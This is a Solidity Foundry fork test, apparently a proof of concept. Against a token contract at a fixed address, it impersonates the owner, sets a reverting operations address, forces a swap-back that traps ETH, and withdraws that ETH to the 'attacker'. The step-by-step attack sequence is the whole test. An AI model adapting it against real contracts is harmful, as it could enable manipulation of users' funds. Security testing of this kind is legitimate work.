pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256, uint256, uint256);
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface FoundationToken {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function dexRouter() external view returns (address);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function enableTrading() external;
    function setOperationsAddress(address _operationsAddress) external;
    function swapTokensAtAmount() external view returns (uint256);
    function tokensForOperations() external view returns (uint256);
    function forceSwapBack() external;
    function withdrawStuckETH() external;
}

// Helper contract to trigger reverts on ETH reception
contract RevertingContract {
    receive() external payable {
        revert();
    }
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);
    FoundationToken token;
    IDexRouter router;
    RevertingContract revertingContract;
    address weth;
    address[] path;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        deal(attacker, 100 ether);

                token = FoundationToken(TARGET);
                revertingContract = new RevertingContract();

                // Get original owner and impersonate to transfer ownership and tokens to attacker
                address originalOwner = token.owner();
                vm.startPrank(originalOwner);
                token.transfer(attacker, token.balanceOf(originalOwner));
                token.transferOwnership(attacker);
                vm.stopPrank();

                // Setup router and path for swaps
                router = IDexRouter(token.dexRouter());
                weth = router.WETH();
                path = new address[](2);
                path[0] = address(token);
                path[1] = weth;

                // Add liquidity to the pool as the new owner (attacker)
                token.approve(address(router), 1000 ether);
                router.addLiquidityETH{value: 10 ether}(
                    address(token),
                    1000 ether,
                    0,
                    0,
                    attacker,
                    block.timestamp
                );

                // Enable trading and set the malicious operations address
                token.enableTrading();
                token.setOperationsAddress(address(revertingContract));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialAttackerBalance = attacker.balance;

                // Step 1: Generate fees by having a non-exempt user perform a swap
                address user = makeAddr("user");
                deal(user, 1 ether);
                uint256 tradeAmount = 1 ether;
                token.transfer(user, tradeAmount);

                vm.startPrank(user);
                token.approve(address(router), tradeAmount);
                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    tradeAmount,
                    0,
                    path,
                    user,
                    block.timestamp + 60
                );
                vm.stopPrank();

                // Ensure fees were collected
                assertGt(token.tokensForOperations(), 0);

                // Step 2: Fund the contract to meet the forceSwapBack condition
                uint256 swapAmount = token.swapTokensAtAmount();
                token.transfer(TARGET, swapAmount);

                // Step 3: Trigger the vulnerability
                token.forceSwapBack();

                // Check that ETH is trapped in the contract
                assertGt(TARGET.balance, 0);

                // Step 4: Withdraw the stuck ETH
                token.withdrawStuckETH();

                // Verify the attacker's balance has increased
                assertGt(attacker.balance, initialAttackerBalance);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

